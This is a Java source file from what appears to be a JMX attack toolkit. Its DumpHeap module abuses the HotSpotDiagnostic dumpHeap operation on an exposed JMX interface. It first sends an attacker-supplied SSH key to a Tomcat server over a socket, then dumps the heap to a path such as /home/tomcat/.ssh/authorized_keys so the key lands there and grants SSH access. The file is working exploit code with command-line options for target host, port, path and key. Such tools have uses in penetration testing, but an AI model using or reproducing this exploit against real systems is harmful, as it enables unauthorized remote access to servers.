package jmxattacks;


import java.net.Socket;
import javax.management.ObjectName;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

import jmxmenus.MainMenu;
import jmxutils.EasyBasicParser;

public class DumpHeap extends Attack{

	
	String description = "This attack will use the dumpHeap methods from com.sun.management. The objective is to put a ssh key on the Linux Server";
	String name = "DumpHeap";
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--http-host 127.0.0.1 --http-port 8080 --path /home/tomcat/.ssh/authorized_keys (or \\\\rogueshare\\share\\file.txt) --key \"ssh_key\"";
	private static String mbean = "com.sun.management:type=HotSpotDiagnostic";
	private static String operation ="dumpHeap";
	private ObjectName object ;
	private String httphost;
	private String httpport;
	private String path;
	private String key;
	
	public DumpHeap()
	{
		this.setAttack_description(description);
		this.setAttack_name(name);	
	}
	
	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		   options.addOption(OptionBuilder
			       .withArgName("http-host")
			       .withLongOpt("http-host")
			       .hasArg()
			       .isRequired()
			       .withDescription("Tomcat server ip")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("http-port")
			       .withLongOpt("http-port")
			       .hasArg()
			       .isRequired()
			       .withDescription("Tomcat server port")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("path")
			       .withLongOpt("path")
			       .hasArg()
			       .isRequired()
			       .withDescription("Path to ssh key on the server")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("key")
			       .withLongOpt("key")
			       .hasArg()
			       .isRequired()
			       .withDescription("ssh key")
			       .create());
		   return options;
	}
	
	private boolean send_key()
	{
	    Socket socket = null;
	    System.out.println("\n#### SSH key will be put in application's memory ####");
	    try {
	        socket = new Socket(this.httphost, Integer.parseInt(this.httpport)); 
	        String message = "\n\n" + this.key +"\n";
	        socket.getOutputStream().write(message.getBytes()); // have to insert the string
	        socket.close();
	        Thread.sleep(3000);
	        System.out.println("#### Now SSH key should be in application's memory ####");
	        
	        return true;
	    } catch (Exception e) {
	    	
	    	System.out.println("Error when puting ssh key in application memory : " + e.getMessage()+"\n\n");
	    	 try {
				Thread.sleep(2000);
			} catch (InterruptedException e1) {
				
				System.out.println(e1.getMessage());	
			}
	    } 
	    return false;		
	}
	
	private void exploit()
	{
		// Test if ssh is send successfully
		if (this.send_key() != false)
		{
			Object retour;
	        Object[] a = new Object[2];
	        a[0] = this.path;
	        a[1] = true;
	        String[] b = new String[2];
	        b[0] = "java.lang.String";
	        b[1]="boolean";
	        System.out.println("####DumpHeap operation will be invoke ####\n");
			retour = invoke(this.object, this.operation,a, b);
			try {
				Thread.sleep(4000);
			} catch (InterruptedException e) {
				System.out.println(e.getMessage());	
			}
		}
		
	}
	
	public void prepareExploit() {
		System.out.println("DumpHeap exploit selected");
		this.object = createObject(this.mbean);
		
		if (this.object != null)
		{
			// Display Menu to retrieve options
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			if (line != null)
			{
				this.httphost = line.getOptionValue("http-host").trim();
			    this.httpport = line.getOptionValue("http-port").trim();
			    this.path = line.getOptionValue("path");
			    this.key = line.getOptionValue("key");
			}
			
			this.exploit();
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
			MainMenu menu = new MainMenu();
	}
	
	public void prepareExploit(String arg) 
	{
		this.object = createObject(this.mbean);
		
		if (this.object != null)
		{
			Parser parser = new EasyBasicParser();
			CommandLine line = null;
			try {
				line = parser.parse( this.setArgs(), StringtoArrayList(arg));
			} catch (ParseException e) {
				System.err.println( "Parsing failed.  Reason: " + e.getMessage() );
				System.exit(-1);
			
			}
			if (line != null)
			{
				this.httphost = line.getOptionValue("http-host").trim();
			    this.httpport = line.getOptionValue("http-port").trim();
			    this.path = line.getOptionValue("path");
			    this.key = line.getOptionValue("key");
			}
			
			this.exploit();
		}
	}
}
